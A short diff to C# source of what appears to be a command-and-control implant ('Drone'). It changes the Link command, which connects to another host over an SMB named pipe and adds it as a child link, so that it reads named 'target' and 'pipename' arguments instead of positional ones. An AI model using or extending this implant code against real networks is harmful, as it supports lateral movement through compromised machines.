@@ -1,6 +1,7 @@
 ﻿using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
+
 using Drone.CommModules;
 
 namespace Drone.Commands;
@@ -13,7 +14,7 @@ public sealed class Link : DroneCommand
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         // this needs to be a hostname
-        var address = task.Arguments[0];
+        var address = task.Arguments["target"];
 
         if (IPAddress.TryParse(address, out var ip))
         {
@@ -21,7 +22,7 @@ public sealed class Link : DroneCommand
             address = entry.HostName;
         }
         
-        var commModule = new SmbCommModule(address, task.Arguments[1]);
+        var commModule = new SmbCommModule(address, task.Arguments["pipename"]);
         await Drone.AddChildCommModule(task.Id, commModule);
     }
 }
